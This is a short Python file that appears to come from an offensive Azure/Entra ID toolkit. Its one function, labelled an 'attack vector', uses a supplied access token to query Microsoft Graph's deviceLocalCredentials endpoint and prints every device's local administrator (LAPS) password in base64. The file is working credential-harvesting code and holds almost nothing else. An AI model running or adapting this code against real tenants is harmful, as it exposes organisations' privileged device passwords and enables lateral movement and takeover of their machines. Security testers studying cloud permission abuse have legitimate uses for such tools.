import requests
import colorama
from colorama import Fore, Style


def Laps_Vectors(request_headers):
    print()
    print(
        "DeviceLocalCredential.Read.All - Allows the app to read device local credential properties including passwords, without a signed-in user.")
    print()
    try:
        print("Attack vector - read laps")

        create_message_URL = "https://graph.microsoft.com/beta/directory/deviceLocalCredentials"
        result = requests.get(create_message_URL, headers=request_headers)
        if result.status_code == 200:
            json = result.json()
            vals = json["value"]
            for device in vals:
                id = device["id"]
                create_message_URL = "https://graph.microsoft.com/beta/directory/deviceLocalCredentials/" + id + "?$select=credentials"
                result = requests.get(create_message_URL, headers=request_headers)
                if result.status_code == 200:
                    json = result.json()
                    values = json["credentials"]
                    for creds in values:
                        print(Fore.GREEN + json["deviceName"] + " : " + creds["passwordBase64"])
                        print(Style.RESET_ALL)

    except:
        pass
